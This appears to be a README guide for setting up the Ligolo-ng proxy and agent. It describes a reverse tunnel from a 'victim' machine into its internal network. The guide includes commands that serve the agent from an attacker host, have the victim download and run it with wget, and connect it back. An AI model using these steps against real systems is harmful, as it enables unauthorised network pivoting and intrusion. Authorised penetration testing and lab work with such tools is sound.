[![Typing SVG](https://readme-typing-svg.demolab.com?font=Fira+Code&size=30&duration=4000&pause=1&color=FFFFFF&multiline=true&width=485&height=80&lines=%E2%94%8C%E2%94%80%E2%94%80(ThisizAmen%E3%89%BFKaniber)-%5B%2F%5D;%E2%94%94%E2%94%80%23+Ligolo+Proxy+Setup)](https://git.io/typing-svg)

## Overview

This guide provides step-by-step instructions to set up Ligolo Proxy and Ligolo Agent for establishing a reverse proxy tunnel between an attacker machine and a victim machine. This setup allows for accessing internal network resources through the tunnel.

### Prerequisites

- Linux-based system
- Root privileges (or equivalent)
- Ligolo Proxy and Ligolo Agent executables

---

## 1. Download Ligolo Proxy and Agent

Before setting up the tunnel, you need to download the necessary executables:

- **Ligolo Proxy**: A tool for setting up the reverse proxy on the attacker machine.
- **Ligolo Agent**: A tool that runs on the victim machine to connect back to the attacker.

### Proxy Download:
```bash
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz
```

### Agent Download:
```bash
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz
```

After downloading, unpack the `.tar.gz` files using:
```bash
tar -xzvf <filename>.tar.gz
```

---

## 2. Setup Ligolo Tunnel on the Attacker Machine

### Change the user from 'root' to your custom user (optional but recommended for security):
```bash
sudo ip tuntap add user <your_username> mode tun ligolo
```

### Delete any conflicting IP routes (if you're using VPN):
```bash
sudo ip route del 192.168.98.0/24 dev tun0
```

### Add the desired internal network range to the Ligolo tunnel:
```bash
sudo ip link set ligolo up
sudo ip route add 192.168.98.0/24 dev ligolo
```

### Start the Ligolo Proxy:
```bash
./proxy -selfcert -laddr 0.0.0.0:443
```

---

## 3. Setup Ligolo Agent on the Victim Machine

### Download the Ligolo Agent from the Attacker Machine:

Ensure you have a Python HTTP server running on the attacker machine to serve the agent:
```bash
python3 -m http.server 8000
```

On the victim machine, download the agent:
```bash
wget http://<attacker_machine_ip>:8000/agent -P /opt/
```

### Make the Agent executable and run it:
```bash
chmod +x /opt/agent
/opt/agent -connect <attacker_machine_ip> -ignore-cert
```

---

## 4. Access the Internal Network (Attacker Machine)

Once the agent is running on the victim machine and connected back to the attacker, follow these steps to access the internal network:

1. Open the Ligolo menu:
```bash
session
```

2. Start the session:
```bash
start
```

---

## Conclusion

You have now successfully set up the Ligolo Proxy and Agent, allowing access to the internal network of the victim machine. You can now interact with the internal resources securely through the established tunnel.

---

### Tips & Troubleshooting

- If the connection is not working, ensure that both machines are on the same network or have reachable IPs.
- Check firewall rules if any traffic is being blocked.
- Ensure that the correct paths for executables are set in the commands.

---

## About the Author

Hi, I am **Amin Gurbanli**. If you have any questions or need further assistance, feel free to connect with me on [LinkedIn](https://www.linkedin.com/in/amin-gurbanli/).
